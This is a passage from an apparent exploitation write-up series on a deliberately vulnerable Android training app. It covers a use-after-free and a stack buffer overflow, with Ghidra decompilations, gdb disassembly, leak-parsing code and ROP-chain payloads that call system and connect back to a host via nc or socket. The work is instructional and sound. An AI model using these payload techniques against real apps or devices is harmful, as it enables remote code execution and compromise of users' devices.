can be NULL! But we cannot trigger execution of arbitrary commands, as they would need parameters. If we were able to drop an executable file on the device, we could be able to execute this file assuming the app is granted enough permissions to access the executable.\nSeeing that the above approaches do not work or, which is more likely, are very time consuming, I decided to change the type of the vulnerability from a Write - What - Where condition to an Execute condition.\nExploitation of UseAfterFreeExecModule The issue with this module is not just the leak (which is the same as in UseAfterFreeWriteModule), but also the implementation of the key - value storage function:\n... obj = malloc(0x108); *(code **)((long)obj + 0x100) = FUN_00100c60; free(obj); keyValue = (object *)calloc(1,0x108); nameLength = (*(*env)-\u0026gt;GetArrayLength)(env,name); len = (uint)nameLength; if (0x100 \u0026lt; len) { len = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; nameBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,name,\u0026amp;iscopy); __memcpy_chk(keyValue,nameBytes,len,0xffffffffffffffff); keyValue-\u0026gt;value = value; result = (char *)(**(code **)((long)obj + 0x100))(keyValue,0); resultLength = __strlen_chk(\u0026amp;result,0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)resultLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)resultLength,(jbyte *)\u0026amp;result); ... In itself, only the fact that obj is reused to call the function at obj + 0x100 seems to be an issue. Seeing that malloc(0x108) and calloc(1, 0x108) both allocate 0x108 bytes, we can deduce (just as before ) that the same chunk is returned.\nNow we just have to exploit this\u0026hellip;\nFinding a better obj + 0x100 From the first section we get a bunch of pointers. E.g. this might look like this:\n[0]: 0x730b9d3c874e \u0026lt;-- ptr: \u0026#34;amazing_key\u0026#34; [1]: 0x730b9d3c875a \u0026lt;-- ptr: \u0026#34;secret_key\u0026#34; [2]: 0x730b9d3c8740 \u0026lt;-- ptr: \u0026#34;topsecret_key\u0026#34; [3]: 0x730b9d3c8765 \u0026lt;-- ptr: \u0026#34;a_very_very_long_key_with_fancy_features_:D\u0026#34; [4]: 0x730b9afdf9a0 \u0026lt;-- stack address: most likely examples [5]: 0x2147eb93990de82b \u0026lt;-- looks more like a canary [6]: 0x730b9afdf8d0 \u0026lt;-- stack address: stored rbp [7]: 0x730c0379ffac \u0026lt;-- return address The first five addresses can be understood if one analyses lookupExamples. The canary is often just a random 8 - byte value that is pushed between a stack frame and the local variables. Depending on the canary type, this can be a terminator - canary, i.e. it contains e.g. a null - byte, or something else. On Android, it is a random canary . Disassembling lookupExamples yields\ngef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples 0x0000730b9d3c8990 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000730b9d3c8991 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x0000730b9d3c8994 \u0026lt;+4\u0026gt;:\tsub rsp,0x70 0x0000730b9d3c8998 \u0026lt;+8\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000730b9d3c89a1 \u0026lt;+17\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax ... and therefore the stack layout is as described above.\nThe problem is that we want to execute e.g. execve or similar, but this function is not referenced in the module itself. This is where the return address comes into play. On my machine, art_quick_generic_jni_trampoline is the function that calls lookupExamples. This may depend on, among other things, the way the function is specified in the java code, i.e. it could be static or non - static. In this case, the return address is art_quick_generic_jni_trampoline+220.\nRunning\n$ readelf --wide --symbols libart.so | grep art_quick_generic_jni_trampoline 7145: 000000000039fed0 378 FUNC LOCAL HIDDEN 14 art_quick_generic_jni_trampoline gives the offset 0x39fed0. Thus, the base address (mind ASLR) of libart.so is\n0x730c0379ffac - 220 - 0x39fed0 = 0x730c03400000 From now on, all code in libart.so is also available to us. Remember that we can overwrite a function pointer, whose function is called with two parameters\nkeyValue: pointer to a user - controlled string \u0026lt;unknown\u0026gt;: NULL We could gamble and hope that execve works here, but most likely it will not. We again do not control enough parameters. Notice that looking for similar functions yields\n$ readelf --wide --symbols libart.so | grep \u0026#34;exec\u0026#34; 199: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execv@LIBC (2) 200: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve@LIBC (2) 271: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi 1304: 0000000000000000 0 FILE LOCAL DEFAULT ABS exec_utils.cc 8795: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execv 8796: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve 10033: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi Looking up execv reveals\nint execv(const char *pathname, char *const argv[]); This time, lets try to at least get to the point where we can execute an arbitrary executable file that we provided, as is described in a previous section .\nThe attentive reader might have noticed that execv does not have any offset, i.e. an offset of 0. Thus it will be resolved when the dynamic linker loads libart.so. To solve that issue, we just have to figure out to which location a call to execv transfers control. Introducing: .plt!\nOne way to find the offset and thus the address of execv is to search for calls of execv in the binary. It turns out that ExecWithoutWait calls execv. Disassembling it yields:\n$ readelf --wide --symbols libart.so | grep ExecWithoutWait 1305: 00000000004b6ac0 560 FUNC LOCAL DEFAULT 14 _ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE gef➤ disassemble 0x4b6ac0 + 0x730c03400000 ... 0x0000730c038b6bf8 \u0026lt;+312\u0026gt;:\tmov rsi,QWORD PTR [rsp+0x20] 0x0000730c038b6bfd \u0026lt;+317\u0026gt;:\tmov rdi,r14 0x0000730c038b6c00 \u0026lt;+320\u0026gt;:\tcall 0x730c03e08f80 \u0026lt;--- symbol stub for execv 0x0000730c038b6c05 \u0026lt;+325\u0026gt;:\tjmp 0x730c038b6c14 \u0026lt;_ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE+340\u0026gt; ... As we know the base address of libart.so, we can compute 0x730c03e08f80 - 0x730c03400000 = 0xa08f80. If we uploaded a test client shell script that connects to 10.0.2.2:4444, chose key = \u0026quot;/data/local/tmp/client\u0026quot; and value=\u0026lt;address of execv\u0026gt;, we would expect to get a connection\u0026hellip;but unfortunately, execution gets denied with an error:\n/com.damnvulnerableapp W/Thread-2: type=1400 audit(0.0:3799): avc: denied { execute } for name=\u0026#34;client\u0026#34; dev=\u0026#34;dm-5\u0026#34; ino=65602 scontext=u:r:untrusted_app:s0:c152,c256,c512,c768 tcontext=u:object_r:shell_data_file:s0 tclass=file permissive=0 app=com.damnvulnerableapp Trying to earn all the fruits As you may have noticed, the above does not really help other than crashing the app. What we want is arbitrary code execution!!! Thus, we can try to transform the above UAF vulnerability into another vulnerability, e.g. a format string vulnerability that is easier to exploit!\nObserve that there is a function called StringPrintf :\nstd::string StringPrintf(const char* fmt, ...) { va_list ap; va_start(ap, fmt); std::string result; StringAppendV(\u0026amp;result, fmt, ap); va_end(ap); return result; } which is a perfect target as we fully control the content of key! Using the same trick as above or by just disassembling the whole .plt and searching for StringPrintf will reveal that its offset is 0xa08570 (in .plt). Notice that StringPrintf internally calls StringAppendV, which again calls vsnprintf.\nTherefore, set key=\u0026lt;format string\u0026gt; and value=address of StringPrintf@plt.\nTesting this reveals that we might be able to use format strings like \u0026ldquo;%4242x\u0026rdquo;, but not \u0026ldquo;%4242x%n\u0026rdquo;, because of the implementation of vfprintf :\n... case \u0026#39;n\u0026#39;: __fortify_fatal(\u0026#34;%%n not allowed on Android\u0026#34;); ... Also, for the above to work, we would need to adjust the call to obj + 0x100 like:\nchar buffer[32] = { 0 }; *(obj + 0x100)(buffer, keyValue); because StringPrintf silently assumes that rdi is an address to a variable that has to store a result of 24 bytes and rsi is the format string. If we did not make the above change, then StringPrintf would zero out the first 24 bytes of our format string, thus completely shutting down the attack. Adding to the pile, we do not have any control over addresses that are accessible via direct parameter access. To be precise, we would need to be lucky enough to find any addresses of interest on the stack like e.g. the format string itself.\nAnother idea could be to call dlopen to get a reference to another library that provides more interesting functionality like system! The offset of the .plt - entry that calls dlopen is 0xa096b0. Thus we can compute the overall virtual address. Unfortunately, this is shut down by the fact that dlopen returns a random 8 - byte value that is a key into a dictionary, whose values are the actual addresses of soinfo - structures, which again contain the base addresses. So it is pretty unlikely to get this right, the best we could do here is either guessing or trying to leak the dictionary via a global variable.\nFinally: the solution Another approach is to try to exploit this UAF vulnerability via a ROP - chain. This is a very destructive approach, but lets see through this:\nFind a gadget that, right before the call of our obj + 0x100 function, modifies the stack in such a way that it will return to keyValue. Put ROP - chain into keyValue. We may use at most 256 // 8 = 32 qwords. This might be sufficient to leak a libc.so address into a global variable in libart.so. It will turn out that this even suffices to get arbitrary, limited - length command execution. Finally restore the old rsp and rbp. This would be necessary for a stealthy approach. Restoring rsp is only really important for calling system, because if rsp points into keyValue, which is located on the heap, system will allocate alot of memory from the heap as if it was a stack, therefore going out-of-bounds fast. So, the gadget of choice is located at 0x39509a and is of the form:\ngef➤ x/10i 0x730c03400000 + 0x39509a 0x730c0379509a \u0026lt;art_quick_do_long_jump+106\u0026gt;:\tpop rdi 0x730c0379509b \u0026lt;art_quick_do_long_jump+107\u0026gt;:\tpop rsi 0x730c0379509c \u0026lt;art_quick_do_long_jump+108\u0026gt;:\tpop rbp 0x730c0379509d \u0026lt;art_quick_do_long_jump+109\u0026gt;:\tadd rsp,0x8 0x730c037950a1 \u0026lt;art_quick_do_long_jump+113\u0026gt;:\tpop rbx 0x730c037950a2 \u0026lt;art_quick_do_long_jump+114\u0026gt;:\tpop rdx 0x730c037950a3 \u0026lt;art_quick_do_long_jump+115\u0026gt;:\tpop rcx 0x730c037950a4 \u0026lt;art_quick_do_long_jump+116\u0026gt;:\tpop rax 0x730c037950a5 \u0026lt;art_quick_do_long_jump+117\u0026gt;:\tpop rsp 0x730c037950a6 \u0026lt;art_quick_do_long_jump+118\u0026gt;:\tret We can use the debugger to figure out how many qwords we need to pop in order for the ret - instruction to return to keyValue:\ngef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair ... 0x0000730b9d3c8b5c \u0026lt;+252\u0026gt;:\tmov rax,QWORD PTR [rbp-0x70] 0x0000730b9d3c8b60 \u0026lt;+256\u0026gt;:\tmov rax,QWORD PTR [rax+0x100] 0x0000730b9d3c8b67 \u0026lt;+263\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x78] \u0026lt;--- keyValue 0x0000730b9d3c8b6b \u0026lt;+267\u0026gt;:\txor ecx,ecx 0x0000730b9d3c8b6d \u0026lt;+269\u0026gt;:\tmov DWORD PTR [rbp-0xac],ecx 0x0000730b9d3c8b73 \u0026lt;+275\u0026gt;:\tmov esi,ecx =\u0026gt; 0x0000730b9d3c8b75 \u0026lt;+277\u0026gt;:\tcall rax \u0026lt;--- execution condition ... gef➤ x/1gx $rbp-0x78 0x730b9afdf818:\t0x0000730cb77bb950 gef➤ x/10gx $rsp 0x730b9afdf7e0:\t0x00000000990de82b\t0x0000730d778087d0 0x730b9afdf7f0:\t0x0000730b9afdfb00\t0x0000730d77808880 0x730b9afdf800:\t0x0000730b9afdfd60\t0x0000730ca77f2750 0x730b9afdf810:\t0x000000d09afdf8b0\t0x0000730cb77bb950 \u0026lt;--- this is keyValue 0x730b9afdf820:\t0x0000730cb77bb950\t0x0000730c0379509c So when we run into call rax, we push an additional return address onto the stack. Therefore we need to pop 1 + 7 qwords from the stack before we can shift the stack into keyValue and hit ret. So we need rsp to be keyValue, then the stack \u0026ldquo;changes\u0026rdquo; to our controlled ROP - chain. Therefore we can make use the Execute condition to run the above gadget, which will then trigger execution of the gadgets located in keyValue.\nNow we will try to leak a libc.so address into a global variable in libart.so. This allows us to compute the libc.so base address, which in turn allows us to call system (the holy grail)! To that end, we will try to find a libc.so address in libart.so. The .got.plt is the best place to start looking. As Android\u0026rsquo;s dynamic linker likes loading shared objects with BIND_NOW (which is probably motivated by RELRO), the .got.plt is already populated with the correct function addresses. This implies that the .got.plt entry of _exit contains the actual address of _exit in the libc.so. Computing the offset of _exit\u0026rsquo;s .got.plt entry yields 0xc1be50 (we could use any other function from libc.so; _exit was chosen arbitrarily).\nObserve that we only need 6 qwords to leak system:\n# Leak exit@libc into rax payload += gadget_pop_rdi payload += address_got_plt_exit payload += gadget_mov_rax_deref_rdi # Put system@libc into rax payload += gadget_pop_rcx payload += p64(offset__exit - offset_system) # --\u0026gt; offset__exit \u0026gt;= offset_system (just testing) payload += gadget_sub_rax_rcx After the above, rax will contain the address of system@libc. Setting up the command to execute can be done by writing to a writable memory area in libart.so (hope that this does not crash; otherwise choose another area until it works). Writing the command could look like this:\npayload += gadget_pop_rdi payload += address_writable_memory payload += gadget_pop_rcx payload += b\u0026#39;nc 10.0.\u0026#39; payload += gadget_mov_deref_rdi_rcx Finally, we want to call system@libc, whose address is stored in rax. The main problem here is that just calling system will most likely crash the app, because rsp still points into the heap. If system uses a lot of stack memory, this will eventually invalidate heap chunks or trigger anti - out - of - bounds security mechanisms. Therefore, we need to restore rsp s.t. it points into a sufficiently large memory area that is assumed to be used by \u0026ldquo;user - code\u0026rdquo;, i.e. e.g. the original stack. Observe that the leaked addresses contained a stack pointer. We can go ahead and write the address of system@libc into that address and then restore the stack with a pop rsp; ret:\n# Write address of system@got.plt to stack address. rdi currently contains the command string! payload += gadget_pop_rcx payload += address_stack payload += gadget_mov_deref_rcx_rax # \u0026lt;-- rax = system@libc # Restore stack. This gadget implicitly calls system payload += gadget_pop_rsp payload += address_stack This exploit is very specific to this module, but it uses a technique that shifts the stack into a user - controlled memory region s.t. successive ret - instructions result in execution of ROP - gadgets.\nComing back from UseAfterFreeExecModule The technique used to exploit the UAF vulnerability in the UseAfterFreeExecModule might be applicable to libUseAfterFreeWriteModule aswell. General steps are:\nSetup a ROP - chain in readable/writeable memory area. In this case, this will be in a shared memory region somewhere is libart.so. Next, overwrite rsp to point to the above mentioned memory region. Then immediately return using ret. Enjoy the ROP - chain It turns out that this does not work by itself. As we can only write one qword in each function call, we can either overwrite the return address to trigger execution of e.g. a gadget or set the stack pointer, but not both at once. Therefore, we need to do a little magic to make things work.\nThe key observation is that rbp is often used to restore rsp in function epilogues. This is precisely what happens in the caller of storePair! See the following assembly of storePair:\ngef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair ... 0x0000730b9ed59abd \u0026lt;+205\u0026gt;:\tmov rcx,QWORD PTR [rbp-0x50] 0x0000730b9ed59ac1 \u0026lt;+209\u0026gt;:\tmov rax,QWORD PTR [rbp-0x58] 0x0000730b9ed59ac5 \u0026lt;+213\u0026gt;:\tmov rax,QWORD PTR [rax] 0x0000730b9ed59ac8 \u0026lt;+216\u0026gt;:\tmov QWORD PTR [rax],rcx \u0026lt;--- write - what - where condition 0x0000730b9ed59acb \u0026lt;+219\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x38] 0x0000730b9ed59acf \u0026lt;+223\u0026gt;:\tmov rax,QWORD PTR [rdi] 0x0000730b9ed59ad2 \u0026lt;+226\u0026gt;:\tmov rax,QWORD PTR [rax+0x600] 0x0000730b9ed59ad9 \u0026lt;+233\u0026gt;:\tmov rsi,QWORD PTR [rbp-0x48] 0x0000730b9ed59add \u0026lt;+237\u0026gt;:\tmov rdx,QWORD PTR [rbp-0x70] 0x0000730b9ed59ae1 \u0026lt;+241\u0026gt;:\tmov ecx,0x2 0x0000730b9ed59ae6 \u0026lt;+246\u0026gt;:\tcall rax 0x0000730b9ed59ae8 \u0026lt;+248\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x60] 0x0000730b9ed59aec \u0026lt;+252\u0026gt;:\tcall 0x730b9ed59b90 \u0026lt;free@plt\u0026gt; 0x0000730b9ed59af1 \u0026lt;+257\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000730b9ed59afa \u0026lt;+266\u0026gt;:\tmov rcx,QWORD PTR [rbp-0x8] 0x0000730b9ed59afe \u0026lt;+270\u0026gt;:\tcmp rax,rcx 0x0000730b9ed59b01 \u0026lt;+273\u0026gt;:\tjne 0x730b9ed59b0d \u0026lt;Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair+285\u0026gt; 0x0000730b9ed59b07 \u0026lt;+279\u0026gt;:\tadd rsp,0x70 0x0000730b9ed59b0b \u0026lt;+283\u0026gt;:\tpop rbp \u0026lt;--- restore old rbp of calling function 0x0000730b9ed59b0c \u0026lt;+284\u0026gt;:\tret It is clear that in between the Write - What - Where condition and the pop rbp - instruction there are no references to the stored old rbp of the calling function. Therefore, we can \u0026ldquo;safely\u0026rdquo; overwrite it. But why would we do this? Consider what happens after we return from storePair:\ngef➤ x/35i 0x0000730c0379ffa9 0x730c0379ffa9:\tcall r11 0x730c0379ffac:\tmov rdi,QWORD PTR gs:0xe0 \u0026lt;--- we return here 0x730c0379ffb5:\tmov rsi,rax 0x730c0379ffb8:\tmovq rdx,xmm0 0x730c0379ffbd:\tcall 0x730c03d62b00 \u0026lt;artInvokeInterfaceTrampolineWithAccessCheck+208\u0026gt; 0x730c0379ffc2:\tmov rcx,QWORD PTR gs:0xa0 0x730c0379ffcb:\ttest rcx,rcx 0x730c0379ffce:\tjne 0x730c037a0034 \u0026lt;art_quick_read_barrier_mark_reg02+116\u0026gt; 0x730c0379ffd0:\tmov rsp,rbp \u0026lt;--- how convenient! 0x730c0379ffd3:\tmovq xmm1,QWORD PTR [rsp+0x18] 0x730c0379ffd9:\tmovq xmm2,QWORD PTR [rsp+0x20] 0x730c0379ffdf:\tmovq xmm3,QWORD PTR [rsp+0x28] 0x730c0379ffe5:\tmovq xmm4,QWORD PTR [rsp+0x30] 0x730c0379ffeb:\tmovq xmm5,QWORD PTR [rsp+0x38] 0x730c0379fff1:\tmovq xmm6,QWORD PTR [rsp+0x40] 0x730c0379fff7:\tmovq xmm7,QWORD PTR [rsp+0x48] 0x730c0379fffd:\tmovq xmm12,QWORD PTR [rsp+0x50] 0x730c037a0004:\tmovq xmm13,QWORD PTR [rsp+0x58] 0x730c037a000b:\tmovq xmm14,QWORD PTR [rsp+0x60] 0x730c037a0012:\tmovq xmm15,QWORD PTR [rsp+0x68] 0x730c037a0019:\tadd rsp,0x70 0x730c037a001d:\tpop rcx 0x730c037a001e:\tpop rdx 0x730c037a001f:\tpop rbx 0x730c037a0020:\tpop rbp 0x730c037a0021:\tpop rsi 0x730c037a0022:\tpop r8 0x730c037a0024:\tpop r9 0x730c037a0026:\tpop r12 0x730c037a0028:\tpop r13 0x730c037a002a:\tpop r14 0x730c037a002c:\tpop r15 0x730c037a002e:\tmovq xmm0,rax 0x730c037a0033:\tret So if we were to pass the function call call 0x730c03d62b00 and rcx = 0, then we reach mov rsp, rbp, where rbp can be a value of our choice if we decide to overwrite the old rbp! After rsp has been set, we can see that we have a lot of references to rsp in order to restore the registers. So in addition to our ROP - chain, we need to ensure that there is a region of size 0x70 + 11 * 0x8 of accessible memory. The content of the accessible memory region can be anything, although we could use it to make an initial setup for the registers. Right after that region, we can place our ROP - chain, as rsp will point to rbp + 0x70 + 11 * 0x8 = rbp + 0xc8. Once we hit the ROP - chain, we can continue as usual in order to set up a command for system etc.\nOnce we want to call system we need to restore the stack in order to make segmentation faults etc. less likely (remember that rsp is currently pointing to some globally accessible memory region, e.g. .bss. We do not want our stack to be there forever!). To that end we write the address of system to the stack pointer that was leaked by lookupExamples, set rsp to that address and call pop rsp; ret:\n# Up to this point, rsp still points into .bss! This will most likely crash the app while calling system! Thus try to reset rsp by abusing the stack pointer leak. We will set rsp to the leaked address, but before we will set the stack value at that leaked address to system@libc! Thus we can use a pop rsp; ret gadget. # Write address of system@got.plt to stack address. rdi currently contains the command string! payload += gadget_pop_rcx payload += address_stack payload += gadget_mov_deref_rcx_rax # Restore stack payload += gadget_pop_rsp payload += address_stack There is only one problem remaining, i.e. when monitoring the exploit with gdb, we can observe that the ROP - chain might execute perfectly fine. But if we try to run the exploit without any debugger attached, it most likely does not work (at least in my case). There may be multiple reasons for that, among which the most probable ones are:\ngdb shifts the stack, because it stores debug information or similar gdb prevents the app from using certain global variables s.t. overwriting them with gdb attached results in no error. It turns out that the first hypothesis is most likely true! To that end, we can try to brute - force over a finite set of possible stack shifts like so:\naddress_old_rbp = p64(u64(leak[4]) - 0x240 + 0x8 * (rbp_shift)) where\nleak[4] is the stack address leak - 0x240 is the offset of the leaked stack address to the address of the old rbp when gdb is attached + 0x8 * rbp_shift shift to try for this run of the exploit. As we are \u0026ldquo;missing\u0026rdquo; gdb, it is very probable that there is less data on the stack, thus we increment the stack address. A big problem could be that both of the above reasons are true. Thus, minizing the ROP - chain we write into global memory can be very helpful to rule out the second reason as much as possible. E.g. we could use a ROP - chain that just calls sleep(42). Then brute - force over all shifts until the app blocks. The shift that caused a block (longer than usual execution times, i.e. it might not block for all 42 seconds, because other threads might try to use overwritten global variables, which probably crashes the app!) is most likely the shift we were looking for.\nSummary It has been a long journey to get to arbitrary code execution, but in the end it worked! We abused the fact that there are no bounds checks for rsp, which allowed for redirecting the stack into attacker - controlled memory regions. This again triggered the execution of a ROP - chain.\nAn upgrade to the above attack would be to use a single ROP - chain that triggers execution of mmap and stores the result in a writable memory region. Then, using the Write - What - Where condition, we could fill the new memory region with arbitrary shellcode. Finally, we can overwrite the return address to redirect control flow into the shellcode.\n","permalink":"https://lolcads.github.io/posts/2024/07/eva_3/","tags":["Android","Binary Exploitation","JNI","E²VA","Use After Free","Memory Leak"],"title":"E²VA: Use After Free Write/Execute Module (Part 4)"},{"categories":null,"content":"Exploitation of EasyStackBufferOverflowModule This article describes exploitation of the EasyStackBufferOverflowModule. During exploitation, various Android - specific caveats are discussed.\nAssumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libEasyStackBufferOverflowModule.so and the EasyStackBufferOverflowModule class. If it is unclear how to get access to these components when only given an .apk file, read the previous blog posts first!\nAnalysis baseline Lets first summarize what we have:\nAccess to libEasyStackBufferOverflowModule.so, which is a shared - object file that can be thrown into Ghidra . Access to .apk file, which can be thrown into jadx . First of all, consider the native function as a black box and just decompile the Java code via jadx. Then, the code for EasyStackBufferOverflowModule should look like this:\npackage com.damnvulnerableapp.vulnerable.modules; import com.damnvulnerableapp.common.exceptions.VulnerableModuleOperationException; import java.nio.ByteBuffer; /* loaded from: classes10.dex */ public final class EasyStackBufferOverflowModule extends VulnerableModule { private native byte[] vulnerableToUpper(byte[] bArr, int i); static { System.loadLibrary(\u0026#34;EasyStackBufferOverflowModule\u0026#34;); } public EasyStackBufferOverflowModule() { super(new StackBufferOverflowModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public final void main() throws VulnerableModuleOperationException { byte[] message; output(\u0026#34;Welcome to the latest version of the echo service \u0026gt;:)\u0026#34;.getBytes()); do { message = input(); int unknown = ByteBuffer.wrap(input()).getInt(); byte[] upper = vulnerableToUpper(message, unknown); output(upper); } while (!new String(message).equals(\u0026#34;EXIT\u0026#34;)); output(\u0026#34;Exiting...\u0026#34;.getBytes()); } } The above code shows that the module takes two distinct inputs per iteration:\na message to be upper - cased an integer that is also part of upper - casing. Both inputs are forwarded to a native function called vulnerableToUpper. Finally, the upper - cased message will be sent back to us.\nFrom EasyStackBufferOverflowModule we can infer that there has to be a function in libEasyStackBufferOverflowModule.so, whose symbol name contains vulnerableToUpper. This can be confirmed via\n$ readelf --wide --symbols libEasyStackBufferOverflowModule.so | grep vulnerableToUpper 6: 00000000000008f0 322 FUNC GLOBAL DEFAULT 12 Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper Okay, time for Ghidra! The following code has already been \u0026ldquo;beautified\u0026rdquo;:\njbyteArray Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper (JNIEnv *env, jobject this, jbyteArray string, jint length) { char c; jbyte *raw; jsize stringLength; jbyteArray array; long fs; uint i; int bufferLength; char buffer [40]; long canary; canary = *(long *)(fs + 0x28); memset(buffer,0,0x20); raw = (*(*env)-\u0026gt;GetByteArrayElements)(env,string,(jboolean *)0x0); stringLength = (*(*env)-\u0026gt;GetArrayLength)(env,string); perfect_memcpy(buffer,raw,(int)stringLength); for (i = 0; i \u0026lt; 0x20; i = i + 1) buffer[i] = toupper((int)buffer[i]); if ((int)length \u0026lt; 0x101) bufferLength = perfect_strlen(buffer) + (int)length; else bufferLength = perfect_strlen(buffer); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)bufferLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)bufferLength,buffer); if (*(long *)(fs + 0x28) == canary) return array; /* WARNING: Subroutine does not return */ __stack_chk_fail(); } void perfect_memcpy(char *dst, char *src, uint size) { uint i; for (i = 0; i \u0026lt; size; i = i + 1) dst[i] = src[i]; return; } uint perfect_strlen(char *string) { uint i; for (i = 0; string[i] != \u0026#39;\\0\u0026#39;; i = i + 1) {} return i; } The Bug As the module name suggests, there is indeed a buffer overflow bug. One function that is often part of a buffer overflow is memcpy. Thus, taking a closer look into how memcpy is used can turn out useful.\nBuffer Overflow First of all, we can see that there is a classical buffer overflow:\n... memset(buffer,0,0x20); raw = (*(*env)-\u0026gt;GetByteArrayElements)(env,string,(jboolean *)0x0); stringLength = (*(*env)-\u0026gt;GetArrayLength)(env,string); perfect_memcpy(buffer,raw,(int)stringLength); ... This is due to the fact that stringLength is computed w.r.t. the length of the input buffer string, but not w.r.t. the length of the destination buffer buffer. Thus, if length \u0026gt; 0x20, a classical buffer overflow occurs. Notice that the user has complete control over the contents and length of string, which is actually of type jbyteArray.\nMemory Leak(s) In addition to the ability of manipulating the whole stack located above buffer, there is a weird sequence of code leading to returning more than \u0026ldquo;intended\u0026rdquo;. Namely:\n... if ((int)length \u0026lt; 0x101) bufferLength = perfect_strlen(buffer) + (int)length; else bufferLength = perfect_strlen(buffer); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)bufferLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)bufferLength,buffer); if (*(long *)(fs + 0x28) == canary) return array; So if length \u0026lt;= 0x100, then it will be added to bufferLength. Technically, setting length \u0026lt; 0 or length \u0026lt; -perfect_strlen(buffer) is possible, but does not seem very useful at first glance. Then, bufferLength bytes are copied from buffer into array. As strlen(buffer) + length \u0026gt; 0x20 = sizeof (buffer) is possible, this might leak arbitrary values from the stack coming after the buffer.\nSumming up, if we sent a payload of the form\nclient.forward(b\u0026#39;\\x42\u0026#39; * 0x20) client.forward(b\u0026#39;\\x00\\x00\\x01\\x00\u0026#39;) # big - endian leak = client.fetch() we would get an additional 0x100 bytes from the memory located above buffer, i.e. from the stack. This leaks, among other things\nReturn address to art_quick_generic_jni_trampoline, which leaks the base of libart.so (almost as awesome as libc.so\u0026hellip;as regards gadgets) Old rbp, i.e. a stack pointer Exploitation \u0026gt;:) Lets assume we already have a leaked libart.so pointer, i.e. we ran:\nclient.forward(b\u0026#39;\\x42\u0026#39; * 0x20) client.forward(b\u0026#39;\\x00\\x00\\x01\\x00\u0026#39;) leak = client.fetch() leak = decompose(leak[0x20:]) canary = leak[1] # libart.so address of art_quick_generic_jni_trampoline+220, # i.e. at file offset 0x39ffac (may differ) libart_base = p64(u64(leak[3]) - 0x39ffac) def decompose(leak : bytes): return [ leak[i * 8:(i+1) * 8] for i in range(len(leak) // 8) ] To figure out that the second qword is the canary, just iterate over the decomposed leak and look for not - address - looking values. I always encountered fully random canaries, i.e. 8 random bytes, which seem to be the default on Android . But this will only be relevant in case e.g. strcpy is used instead of e.g. memcpy.\nUsing your favourite tool for gadget extraction, like ropper or ROPgadget , you can construct a ROP - chain to get arbitrary code execution. Basically, your payload could look like this:\npayload = b\u0026#39;\\x42\u0026#39; * 0x20 payload += leak[0] # \u0026lt;-- unknown address payload += canary payload += leak[2] # \u0026lt;-- probably old rbp payload += gadget_1 payload += gadget_2 payload += enjoy ... because the leaked data from the stack looked like this (from low to high addresses):\nlower 0x72d1b9cdc210 \u0026lt;-- unknown address | 0x79291c4ee3e94be3 \u0026lt;-- that is the canary | 0x72d08b1c28b0 \u0026lt;-- probably old rbp higher 0x72d0f87a032c \u0026lt;-- this is your most favourite address to leak Notice that we do not need to care about the unknown address, because we are almost done.\nLets briefly think about how to approach the holy grail, i.e. arbitrary code execution. At first glance, a few options come to mind (consider the fact that e.g. libart.so is compiled with RELRO etc.):\nROP - chain that contains all the \u0026ldquo;code\u0026rdquo; (via gadgets) to execute. This (almost irreversibly) destroys the stack and you cannot expect that the app will recover from that. smaller ROP - chain that writes some qwords into global memory (e.g. .data@libart.so or .bss@libart.so) and then restores the stack. smaller ROP - chain that allocates writable and executable memory via e.g. mmap, writes the pointer returned in rax into global memory (thus only 8 bytes of global memory are invalidated). Then proceed as in 2. just with the new memory to write shellcode. Finally return into the shellcode. sigrop , but there is no reason to use this. For this blog post, we will only consider the first option, i.e. destroying the stack (don\u0026rsquo;t worry the other ones will be covered in later posts ;D).\nThe naming convention for gadgets is like this: gadget_opcode_operand1_operand2_opcode_operand1.... So you need to be able to identify opcodes on Intel (the emulator runs on x86_64) to understand the ROP - chain. The following is an example of a ROP - chain connecting to 10.0.2.2:4440, where 10.0.2.2 is an alias to your loopback interface :\n# Setup payload payload = b\u0026#39;a\u0026#39; * 0x20 payload += leak[0] # \u0026lt;-- unknown address payload += canary payload += leak[2] # \u0026lt;-- probably old rbp # Dynamically compute libc address via toupper@.got in libStackBufferOverflowModule.so # and store it into writable_memory payload = compute_libc_base(payload, writable_memory) payload = call_libc_function( payload, writable_memory, \u0026#39;socket\u0026#39;, 